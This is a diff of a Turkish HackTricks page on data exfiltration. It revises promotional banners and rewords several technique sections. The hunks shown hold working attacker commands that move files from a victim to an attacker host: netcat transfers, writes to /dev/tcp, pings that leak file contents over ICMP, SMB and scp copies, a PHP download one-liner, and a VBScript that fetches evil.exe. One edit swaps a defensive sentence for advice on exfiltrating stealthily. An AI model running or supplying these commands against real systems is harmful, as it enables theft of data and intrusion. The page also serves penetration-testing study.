@@ -1,20 +1,21 @@
 # Veri Çıkarma
 
+{% hint style="success" %}
+AWS Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert) ile sıfırdan kahramana kadar AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>HackTricks'i Destekleyin</summary>
 
-HackTricks'ı desteklemenin diğer yolları:
-
-* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
-* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin.**
-* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
+* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
+* **Hacking püf noktalarını paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
 
 </details>
+{% endhint %}
 
-**Try Hard Security Group**
+**Try Hard Güvenlik Grubu**
 
 <figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
@@ -24,7 +25,7 @@ HackTricks'ı desteklemenin diğer yolları:
 
 ## Bilgi çıkarmak için genellikle izin verilen alan adları
 
-[https://lots-project.com/](https://lots-project.com/) adresini kontrol ederek kötüye kullanılabilecek genellikle izin verilen alan adlarını bulun
+Kötüye kullanılabilen genellikle izin verilen alan adlarını bulmak için [https://lots-project.com/](https://lots-project.com/) adresini kontrol edin
 
 ## Base64 Kopyala ve Yapıştır
 
@@ -193,14 +194,14 @@ Windows
 
 Exfiltration is the unauthorized transfer of data from a target system. There are various methods to exfiltrate data from a compromised system, including:
 
-1. **Email**: Sending data as email attachments to an external email address.
-2. **FTP**: Transferring data using the File Transfer Protocol to a remote server.
-3. **DNS**: Encoding data within DNS requests to leak information.
-4. **HTTP/HTTPS**: Sending data over HTTP or HTTPS to a remote server.
-5. **Steganography**: Hiding data within images or other files to avoid detection.
-6. **Cloud Storage**: Uploading data to cloud storage services like Dropbox or Google Drive.
+- **Email**: Sending data as email attachments to an external email address.
+- **FTP**: Transferring data using the File Transfer Protocol to an external server.
+- **DNS**: Encoding data within DNS requests to leak information.
+- **HTTP/HTTPS**: Sending data over HTTP or HTTPS to a remote server.
+- **Steganography**: Hiding data within other files to avoid detection.
+- **Cloud Storage**: Uploading data to cloud storage services for retrieval later.
 
-Exfiltration can be a critical phase in a cyber attack, as it allows threat actors to steal sensitive information from a target organization. It is essential for organizations to implement strong security measures to prevent data exfiltration and protect their valuable assets.
+It is essential for attackers to exfiltrate data stealthily to avoid detection by security measures.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -216,7 +217,7 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Eğer kurbanın SSH'si varsa, saldırgan kurbandan saldırganın bilgisayarına bir dizin bağlayabilir.
+Eğer kurbanın SSH'si varsa, saldırgan kurbandan saldırgana bir dizin bağlayabilir.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -224,14 +225,14 @@ sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP addre
 ```
 ## NC
 
-NC, or Netcat, is a versatile networking tool that can be used for exfiltration. It can create connections to remote systems, listen for incoming connections, and transfer data between systems. NC can be used to exfiltrate data over various protocols such as TCP or UDP. It is a powerful tool for both red teaming and penetration testing engagements.
+NC, or Netcat, is a versatile networking tool that can be used for various purposes during a penetration test. It can be used for port scanning, banner grabbing, transferring files, and even creating reverse shells. Netcat can also be used for exfiltration by sending data over the network to an attacker-controlled machine.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### Kurbanın cihazından dosya indirin
+### Kurbanın cihazından dosya indir
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
@@ -243,11 +244,9 @@ nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-## **ICMP**
+Teşekkürler **@BinaryShadow\_**
 
 ## **ICMP**
-
-ICMP, Internet Control Message Protocol, is a network layer protocol used to send error messages and operational information indicating success or failure when communicating with a host. ICMP can also be used for exfiltration purposes due to its low detection rate and ability to bypass firewalls.
 ```bash
 # To exfiltrate the content of a file via pings you can do:
 xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
@@ -287,13 +286,13 @@ cp /path/tp/nc.exe /tftp
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-**kurban** üzerinde, Kali sunucusuna bağlanın:
+**victim** üzerinde, Kali sunucusuna bağlanın:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-PHP ile bir dosyayı indirin:
+PHP'de bir oneliner ile bir dosya indirin:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -301,7 +300,7 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 
 ### VBScript Exfiltration
 
-VBScript can be used to exfiltrate data from a compromised system. This can be achieved by encoding the data and sending it to an external server controlled by the attacker. VBScript can also be used to compress the data before exfiltration to minimize the amount of data sent over the network. This technique can help attackers avoid detection by security tools that monitor network traffic for suspicious patterns.
+VBScript can be used to exfiltrate data from a compromised system. This can be achieved by reading files, accessing system information, or interacting with network resources. VBScript can then encode the data and send it to an external server using various techniques such as HTTP requests or DNS queries. This allows an attacker to steal sensitive information without being easily detected.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -339,7 +338,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-`debug.exe` programı sadece ikili dosyaların incelenmesine izin vermekle kalmaz, aynı zamanda onları onaltılıktan yeniden oluşturma yeteneğine sahiptir. Bu, bir ikili dosyanın onaltılık bir gösterimini sağlayarak `debug.exe`nin ikili dosyayı oluşturabilmesi anlamına gelir. Bununla birlikte, debug.exe'nin **64 kb boyutundaki dosyaları birleştirme sınırlaması olduğunu** unutmamak önemlidir.
+`debug.exe` programı sadece ikili dosyaların incelenmesine izin vermekle kalmaz, aynı zamanda onları onaltılıktan yeniden oluşturma yeteneğine de sahiptir. Bu, bir ikili dosyanın onaltılık bir gösterimini sağlayarak `debug.exe`nin ikili dosyayı oluşturabilmesi anlamına gelir. Bununla birlikte, debug.exe'nin **64 kb boyutundaki dosyaları birleştirme sınırlaması olduğunu** unutmamak önemlidir.
 ```bash
 # Reduce the size
 upx -9 nc.exe
@@ -360,17 +359,18 @@ Ardından metni windows-shell'e kopyalayıp yapıştırın ve nc.exe adında bir
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
+{% hint style="success" %}
+AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmaya kadar AWS hackleme öğrenin!</summary>
+<summary>HackTricks'i Destekleyin</summary>
 
-HackTricks'ı desteklemenin diğer yolları:
-
-* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)'da takip edin.
-* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
+* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
+* Hacking püf noktalarını paylaşarak PR'ler göndererek **HackTricks** ve **HackTricks Cloud** github depolarına katkıda bulunun.
 
 </details>
+{% endhint %}
 ```
